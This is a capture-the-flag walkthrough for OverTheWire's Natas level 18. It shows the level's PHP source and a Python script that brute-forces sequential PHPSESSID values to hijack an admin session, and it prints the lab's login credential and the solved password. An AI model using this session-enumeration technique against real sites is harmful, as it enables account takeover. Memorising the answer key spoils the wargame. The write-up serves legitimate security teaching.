# Natas Level 18 → 19

## Goal

The level has a login form. Valid credentials get you a **session ID** (stored in a `PHPSESSID` cookie), and admin sessions see the password. The server's session IDs are **sequential integers 1..640**, so you can brute-force the admin session by iterating through all of them.

## Concepts you'll learn

- Why session IDs must be *unguessable* — sequential or small-range IDs invite brute force
- Using Python's `requests.Session` to carry cookies
- A loop that tries each candidate PHPSESSID and watches for an admin-only indicator in the response

## Walkthrough

### 1. View the source

```php
$maxid = 640;

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") { /* ... */ }
}

function printAdminPage() {
    echo "The password for natas19 is <censored>";
}

session_start();
// assign a random PHPSESSID from 1..640
// if the session's "admin" flag is set, print admin page
```

If **any** session in 1..640 has the admin flag set, you can hijack it just by setting your cookie to that ID.

### 2. Brute-force

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas18.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

for sid in range(1, 641):
    r = requests.get(URL, auth=AUTH, cookies={"PHPSESSID": str(sid)},
                     params={"username": "admin", "password": "anything"})
    if "password for natas19" in r.text:
        print(f"admin session id: {sid}")
        print(r.text)
        break
```

This tries every ID. One of them (say `119`) is flagged as admin; hitting it prints the admin page — which contains:

```
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

## The answer

The password for `natas19` is:

**`4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas18.natas.labs.overthewire.org/>
